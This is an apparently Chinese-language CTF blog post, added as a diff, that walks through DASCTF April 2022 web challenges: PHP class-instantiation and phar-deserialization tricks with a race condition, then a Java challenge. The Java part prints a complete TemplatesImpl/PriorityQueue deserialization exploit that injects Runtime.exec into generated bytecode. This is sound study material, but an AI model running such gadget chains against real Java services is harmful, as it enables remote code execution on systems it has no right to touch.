@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Xi4nb3i" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      dasctf4月赛 
+      
+      
+    
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.svg">
+    <link rel="icon" href="/images/favicon.svg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto:400,400italic,600|Roboto+Mono" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/common.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+
+
+  
+
+  
+    
+<link rel="stylesheet" href="/css/post.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Xi4nb3i's blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <a href="/">Xi4nb3i</a>
+</div>
+
+
+      <p class="links">
+  
+    <a title="archives" target="" href="/archives/">
+      <i class="iconfont icon-bookmark"></i>
+    </a>
+  
+    <a title="github" target="_blank" href="https://github.com/xianbeil">
+      <i class="iconfont icon-github"></i>
+    </a>
+  
+</p>
+
+
+      <div class="main">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']]
+    }
+  };
+</script>
+
+<div class="post">
+  <h3 class="date">
+    May 25, 2022
+  </h3>
+  <h1>
+    dasctf4月赛
+  </h1>
+  <div class="content markdown-body">
+    <h2 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h2><p>附件给了4个类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;<span class="comment">//__get</span></span><br><span class="line">        <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">run</span>();<span class="comment">//__call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Action</span>(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可控的就是Action类中的construct方法，给的类很多，</p>
+<p>从他继承的抽象类的run方法一直进去，反正变量都可控，随便打</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518192621-gsp7td3.png" alt="image.png"></p>
+<h2 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h2><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>.<span class="number">3</span>-fpm</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /tmp/files/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src /var/www/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:root /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 755 /var/www/html &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R www-data:www-data /var/www/html/uploads &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;/security/d&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install nginx -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    /bin/mv -f /tmp/files/default  /etc/nginx/sites-available/default &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    gcc /tmp/files/copyflag.c -o /copyflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 4711 /copyflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /tmp/files &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /var/lib/apt/lists/* &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 700 /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> nginx&amp;&amp;php-fpm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+
+<p>index.php中有注释，标注了edit.php，简单构造能够读到源码</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518194507-ta3lasm.png" alt="image.png"></p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518194514-hq2mbfa.png" alt="image.png"></p>
+<p>这道题是可以用条件竞争非预期的，就是再覆盖flag那里可以趁他覆盖之前，访问head.png，读到就行</p>
+<ol>
+<li>利用文件上传上传 phar文件</li>
+<li>写入超长文件名使得 <code>symlink()</code>函数出错返回 false</li>
+<li><code>unlink()</code>触发 phar 反序列化将flag写入到可读的<code>/tmp/flag.txt</code> 处</li>
+<li>建立与 <code>/tmp/flag.txt</code> 与 <code>uploads/head.png</code> 的软连接</li>
+<li>在建立与 <code>/tmp/flag.txt</code> 的软链接之前程序会将原来写入的flag给覆盖掉。所以要在覆盖flag后，另一个线程已经在copy <code>/falg</code>到 <code>/tmp/flag.txt</code>，这样 <code>/uploads/head.png</code>与<code>/tmp/flag.txt</code>建立了链接，同时flag也没有被覆盖，然后访问 <code>/uploads/head.png</code>读取即可。</li>
+</ol>
+<p>这里研究作者的预期解，如何让symlink函数报错进到unlink里面</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518200409-92bp8yw.png" alt="image.png"></p>
+<p>这里出题人翻了symlink函数对应的底层c源码，寻找他其中返回false的情况</p>
+<p>$filename的长度设置为4096以上，会导致symlink返回false</p>
+<p>下面还有一点，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="variable">$contents</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$contents</span>,<span class="string">&quot;flag&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">filewrite</span>(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518201617-ruto186.png" alt="image.png"></p>
+<p>这里的<code>$f = fopen($filename,&quot;r&quot;);</code>句柄未关闭，导致可以在&#x2F;proc&#x2F;pid&#x2F;fd&#x2F;fd下读到，且距离die还贴心的给了2秒钟让你爆破</p>
+<p>从而可以读到flag内容</p>
+<p>剩下的是一些调试上的问题，可惜还没有开始玩底层php，这道题之后有时间再看c源码吧</p>
+<p><a target="_blank" rel="noopener" href="http://max666.fun/21.html">http://max666.fun/21.html</a></p>
+<h2 id="warmup-java"><a href="#warmup-java" class="headerlink" title="warmup-java"></a>warmup-java</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>依赖：</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220519185250-d1r913u.png" alt="image.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/warmup&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">greeting</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> Class type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyInvocationHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Method[] methods = <span class="built_in">this</span>.type.getDeclaredMethods();</span><br><span class="line">        Method[] var5 = methods;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> methods.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>; var7 &lt; var6; ++var7) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">xmethod</span> <span class="operator">=</span> var5[var7];</span><br><span class="line">            xmethod.invoke(args[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>存在问题就是远程打不通，本地通了，猜测是serialVersionUID的问题，这个明天问了佬再解决。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.warmup.MyInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.util.Utils;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> Exp.createTemplatesImpl(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">MyInvocationHandler</span> <span class="variable">myInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyInvocationHandler</span>(TemplatesImpl.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(myInvocationHandler,<span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> (Comparator) Proxy.newProxyInstance(MyInvocationHandler.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Comparator.class &#125;,myInvocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Utils.objectToHexString(queue);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="type">byte</span>[] b = Utils.hexStringToBytes(s);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">createTemplatesImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//修改Neo类，插入command，创建恶意字节码，此处参考ysoserial</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.getCtClass(StubTransletPayload.class.getName());</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">                command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">                <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;s&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  </div>
+  
+    
+      <a id="older" class="blog-nav" href="/2022/05/16/nginx%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/">OLDER&nbsp;&gt;</a>
+      
+        
+          <a id="newer" class="blog-nav" href="/2022/05/28/ejs%E6%A8%A1%E6%9D%BFrce%E7%9A%84%E5%88%9D%E6%8E%A2/">&lt;&nbsp;NEWER</a>
+          
+            
+</div>
+        <div class="footer">
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Copyright © Leedom 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Theme by Leedom | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+
+
+    </div>
+  </body>
+</html>
